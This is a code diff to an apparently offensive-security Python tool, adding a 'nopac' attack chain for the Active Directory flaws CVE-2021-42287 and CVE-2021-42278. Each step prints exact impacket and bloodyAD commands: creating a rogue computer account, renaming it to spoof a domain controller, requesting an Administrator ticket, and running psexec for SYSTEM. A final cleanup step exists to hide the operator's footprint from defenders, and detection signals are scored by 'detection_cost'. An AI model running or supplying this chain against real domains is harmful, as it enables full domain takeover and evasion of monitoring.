@@ -622,6 +622,36 @@ SIGNALS_ESC1_ENROLL = (
                     note="TGT request adjacent to the enrolled cert (PKINIT)"),
 )
 
+# ---------------------------------------------------------------- NoPac signals
+
+SIGNALS_NOPAC_QUOTA_CHECK = (
+    DetectionSignal(kind="ldap-write", identifier="ms-DS-MachineAccountQuota read",
+                    count=0,
+                    note="LDAP read on domain-level attribute (rarely alerted)"),
+)
+SIGNALS_NOPAC_ADDCOMPUTER = (
+    DetectionSignal(kind="ldap-write", identifier="msDS-CreatedComputer",
+                    note="LDAP add of a Computer object (event 4741 on the DC)"),
+    DetectionSignal(kind="win-event", identifier="4741",
+                    note="A computer account was created — flags the source user"),
+)
+SIGNALS_NOPAC_SAM_SPOOF = (
+    DetectionSignal(kind="ldap-write", identifier="sAMAccountName modify",
+                    note="LDAP write flipping the new account's name to match a DC"),
+    DetectionSignal(kind="win-event", identifier="4742",
+                    note="Computer account was changed — flags the sAMAccountName rename"),
+)
+SIGNALS_NOPAC_S4U2SELF = (
+    DetectionSignal(kind="kerb-ticket", identifier="TGS-REQ/S4U2Self",
+                    note="S4U2Self TGS-REQ; server=krbtgt gets a DC ticket back"),
+    DetectionSignal(kind="win-event", identifier="4769",
+                    note="Kerberos service ticket request — DC-name'd account gets DC-authored ticket"),
+)
+SIGNALS_NOPAC_RESTORE = (
+    DetectionSignal(kind="ldap-write", identifier="sAMAccountName revert",
+                    note="LDAP write reverting the sAMAccountName back to the operator's placeholder"),
+)
+
 
 # ---------------------------------------------------------------- post-relay steps
 
@@ -1600,4 +1630,173 @@ def esc1_chain(target_dc, ca_name=None, cred=None):
                  _dcsync_action,
                  detection_cost=3,
                  signals=SIGNALS_DCSYNC),
+        ))
+
+
+# ---------------------------------------------------------------- NoPac profile
+
+def _nopac_quota_action(chain, ctx):
+    """Read ms-DS-MachineAccountQuota on the domain root — the default
+    is 10, meaning any authenticated user can add up to 10 computer
+    accounts. The whole NoPac chain hinges on this being non-zero.
+
+    Manual-outcome step in this cut — the actual LDAP read wants
+    impacket / ldap3 / bloodyAD which fieldkit calls out to.
+    Evidence names each exact command."""
+    _ = chain
+    domain = getattr(ctx, "domain", None)
+    if not domain:
+        return Outcome(
+            kind="manual",
+            evidence="no domain on ctx — pass --domain <AD-DOMAIN> "
+                     "for NoPac quota check")
+    return Outcome(
+        kind="manual",
+        evidence=(f"check ms-DS-MachineAccountQuota on {domain} — expect >0. "
+                  f"Run: `nxc ldap {chain.target} -u <user> -p <pass> "
+                  f"-M maq` or `bloodyAD --host {chain.target} -u <user> "
+                  f"-p <pass> get object 'DC=corp,DC=local' "
+                  f"--attr ms-DS-MachineAccountQuota`"))
+
+
+def _nopac_addcomputer_action(chain, ctx):
+    """Create a fresh computer account in the domain via impacket-
+    addcomputer / bloodyAD. Manual-outcome; the actual RPC creation
+    wants impacket."""
+    _ = chain
+    cred = getattr(ctx, "cred", None)
+    domain = getattr(ctx, "domain", None) or "<domain>"
+    if not cred:
+        return Outcome(
+            kind="manual",
+            evidence="no cred on ctx — pass --cred-id <N> for NoPac "
+                     "(needs a low-priv domain credential)")
+    user = cred.get("username", "<user>")
+    pw = cred.get("password", "<pass>")
+    return Outcome(
+        kind="manual",
+        evidence=(f"create computer account: `impacket-addcomputer "
+                  f"-computer-name 'FKPWN$' -computer-pass 'F1eldk1t!' "
+                  f"-dc-ip {chain.target} "
+                  f"'{domain}/{user}:{pw}'`"))
+
+
+def _nopac_sam_spoof_action(chain, ctx):
+    """Rename the created computer account's sAMAccountName to
+    match a DC's name (minus the trailing $). CVE-2021-42278 —
+    the KDC looks up the account by sAMAccountName during S4U2self,
+    so a rename-to-DC-name passes as the real DC."""
+    _ = chain
+    cred = getattr(ctx, "cred", None) or {}
+    domain = getattr(ctx, "domain", None) or "<domain>"
+    dc_name = getattr(ctx, "dc_name", None) or "DC01"
+    user = cred.get("username", "<user>")
+    pw = cred.get("password", "<pass>")
+    return Outcome(
+        kind="manual",
+        evidence=(f"rename FKPWN$ → {dc_name} (no trailing $): "
+                  f"`bloodyAD --host {chain.target} "
+                  f"-u '{user}' -p '{pw}' -d '{domain}' "
+                  f"set object 'CN=FKPWN,CN=Computers,{_dn_from_domain(domain)}' "
+                  f"sAMAccountName -v '{dc_name}'`"))
+
+
+def _nopac_s4u2self_action(chain, ctx):
+    """S4U2self via the DC-named computer account. Because
+    sAMAccountName now matches a real DC (minus its $), the KDC
+    (CVE-2021-42287) mints a service ticket for krbtgt — usable
+    as a TGT for the DC computer account → Administrator via
+    pass-the-ticket."""
+    _ = chain
+    dc_name = getattr(ctx, "dc_name", None) or "DC01"
+    impersonate = getattr(ctx, "impersonate", None) or "Administrator"
+    return Outcome(
+        kind="manual",
+        evidence=(f"S4U2self via impacket: `impacket-getST "
+                  f"-self -impersonate '{impersonate}' "
+                  f"-spn 'krbtgt/{dc_name}' "
+                  f"'FKPWN:F1eldk1t!'` — writes {impersonate}.ccache. "
+                  f"Use with `KRB5CCNAME=... impacket-psexec "
+                  f"'{dc_name}$'@{chain.target} -k -no-pass` for SYSTEM"))
+
+
+def _nopac_restore_action(chain, ctx):
+    """Rename the sAMAccountName back to `FKPWN$` so the operator's
+    footprint is a plain computer account rather than an on-brand
+    DC name that would trip a defender's next audit of the
+    Computers OU."""
+    _ = chain
+    cred = getattr(ctx, "cred", None) or {}
+    domain = getattr(ctx, "domain", None) or "<domain>"
+    user = cred.get("username", "<user>")
+    pw = cred.get("password", "<pass>")
+    return Outcome(
+        kind="manual",
+        evidence=(f"revert sAMAccountName: `bloodyAD --host {chain.target} "
+                  f"-u '{user}' -p '{pw}' -d '{domain}' "
+                  f"set object 'CN=FKPWN,CN=Computers,{_dn_from_domain(domain)}' "
+                  f"sAMAccountName -v 'FKPWN$'`"))
+
+
+def _dn_from_domain(domain):
+    """CORP.LOCAL → DC=CORP,DC=LOCAL for a rough default DN."""
+    if not domain:
+        return "DC=corp,DC=local"
+    return ",".join(f"DC={p}" for p in domain.split("."))
+
+
+@register("nopac")
+def nopac_chain(target_dc, cred=None, domain=None, impersonate=None):
+    """NoPac (CVE-2021-42287 + CVE-2021-42278): sAMAccountName spoof
+    + S4U2self on a controllable computer account → DC-authored
+    service ticket for Administrator → SYSTEM on the target DC.
+
+    Requires: a low-priv authenticated domain user (any account
+    the domain accepts an LDAP bind for), ms-DS-MachineAccountQuota
+    > 0 on the domain root (default is 10), the DC unpatched for
+    CVE-2021-42287 and CVE-2021-42278 (rollup KB5008380 /
+    KB5008218 shipped November 2021).
+
+    6 steps: reachability → discover:maq → create:computer-account
+    → modify:sam-spoof → request:s4u2self-tgt → cleanup:restore-sam.
+    Every non-preflight step is manual-outcome in this cut — the
+    actual LDAP/RPC dance wants impacket + bloodyAD; the step
+    evidence names each exact command.
+
+    A patched DC refuses the S4U2self request (KDC validates the
+    sAMAccountName no longer matches a real DC after the rename
+    gate); the operator sees a KDC_ERR_S_PRINCIPAL_UNKNOWN from
+    the request:s4u2self-tgt step.
+    """
+    _ = cred, domain, impersonate      # threaded via ctx by the CLI
+    return Chain(
+        profile="nopac",
+        target=target_dc,
+        steps=(
+            REACHABILITY_STEP,
+            Step("discover:maq",
+                 "attacker-side",
+                 _nopac_quota_action,
+                 detection_cost=0,
+                 signals=SIGNALS_NOPAC_QUOTA_CHECK),
+            Step("create:computer-account",
+                 "attacker-side",
+                 _nopac_addcomputer_action,
+                 detection_cost=3,
+                 signals=SIGNALS_NOPAC_ADDCOMPUTER),
+            Step("modify:sam-spoof",
+                 "attacker-side",
+                 _nopac_sam_spoof_action,
+                 detection_cost=3,
+                 signals=SIGNALS_NOPAC_SAM_SPOOF),
+            Step("request:s4u2self-tgt",
+                 "attacker-side",
+                 _nopac_s4u2self_action,
+                 detection_cost=2,
+                 signals=SIGNALS_NOPAC_S4U2SELF),
+            Step("cleanup:restore-sam",
+                 "attacker-side",
+                 _nopac_restore_action,
+                 detection_cost=1,
+                 signals=SIGNALS_NOPAC_RESTORE),
         ))
